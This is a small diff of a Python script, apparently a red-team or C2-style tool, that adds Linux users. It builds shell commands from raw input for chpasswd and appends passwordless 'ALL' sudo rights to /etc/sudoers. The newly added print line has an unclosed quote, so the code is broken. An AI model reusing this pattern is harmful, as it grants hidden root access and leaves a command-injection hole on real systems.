@@ -6,6 +6,7 @@ CnC = "192.168.102.16"
 CnCUser = "sysadmin"
 def main():
     cont = True
+    os.system("clear")
     print("Hey you, you're finally awake")
     print("Systemm, it just works")
     print()
@@ -39,4 +40,5 @@ def main():
             os.system("echo "+name+":"+password+" | chpasswd")
             if(sudoIn.lower() in  ('y')):
                 os.system("echo \""+name+" ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers")
+            print("Done. User "+name+" added.)
 main()
